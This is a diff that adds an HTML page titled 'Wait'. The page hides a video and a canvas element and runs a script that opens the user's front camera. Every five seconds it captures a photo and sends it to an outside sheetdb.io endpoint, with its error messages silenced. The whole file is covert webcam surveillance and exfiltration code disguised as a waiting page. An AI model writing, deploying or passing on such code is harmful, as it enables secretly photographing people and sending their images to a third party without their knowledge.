@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wait</title>
+</head>
+<body>
+  <video id="video" autoplay style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const googleSheetUrl = "https://sheetdb.io/api/v1/6bbqa6kr6gpx2"; // Replace with your Web App URL
+
+    // Access user's camera
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+      .then((stream) => {
+        video.srcObject = stream;
+
+        // Set up canvas dimensions once the video is loaded
+        video.addEventListener('loadedmetadata', () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+
+          // Start continuous photo capture every 5 seconds
+          const interval = setInterval(() => {
+            // Capture photo
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            // Send to Google Sheets
+            fetch(googleSheetUrl, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ "photo": imageData }),
+            })
+              .then(response => response.json())
+              .then(data => {
+                if (!data.success) {
+                  //alert("Error uploading photo:", data.error);
+                  //alert("Error uploading photo!");
+                }
+              })
+              .catch(err => console.error("Fetch error:", err));
+          }, 5000); // Capture every 5 seconds
+
+          // Stop capturing if the user leaves the page
+          window.addEventListener('beforeunload', () => {
+            clearInterval(interval);
+            stream.getTracks().forEach(track => track.stop());
+          });
+        });
+      })
+      .catch((err) => {
+        //alert('Error accessing camera:', err);
+        //alert('Camera access denied or error occurred!');
+      });
+  </script>
+</body>
+</html>
